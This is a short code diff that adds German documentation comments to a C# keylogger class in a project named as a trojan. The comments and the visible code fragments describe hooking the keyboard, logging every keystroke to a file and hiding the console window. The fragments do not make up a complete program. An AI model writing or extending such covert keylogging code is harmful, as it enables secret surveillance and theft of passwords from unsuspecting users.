@@ -22,6 +22,9 @@ namespace DNAV_Trojaner
         private static string _path;
         const int SW_HIDE = 0;
 
+        /// <summary>
+        /// Enthält die gedrückten Tasten
+        /// </summary>
         public static string Keys
         {
             get
@@ -91,6 +94,9 @@ namespace DNAV_Trojaner
             }
         }
 
+        /// <summary>
+        /// Aktiviert den Keylogger
+        /// </summary>
         public static void Enable()
         {
             _hookID = SetHook(_proc);
@@ -98,6 +104,10 @@ namespace DNAV_Trojaner
             UnhookWindowsHookEx(_hookID);
         }
 
+        /// <summary>
+        /// Aktiviert den Keylogger und schreibt alle Tastenanschläge in eine Log Datei
+        /// </summary>
+        /// <param name="path"></param>
         public static void EnableWithLog(string path)
         {
             Keylogger._logFile = true;
@@ -107,6 +117,9 @@ namespace DNAV_Trojaner
             UnhookWindowsHookEx(_hookID);
         }
 
+        /// <summary>
+        /// Versteckt das Konsolenfenster
+        /// </summary>
         public static void Hide()
         {
             var handle = GetConsoleWindow();
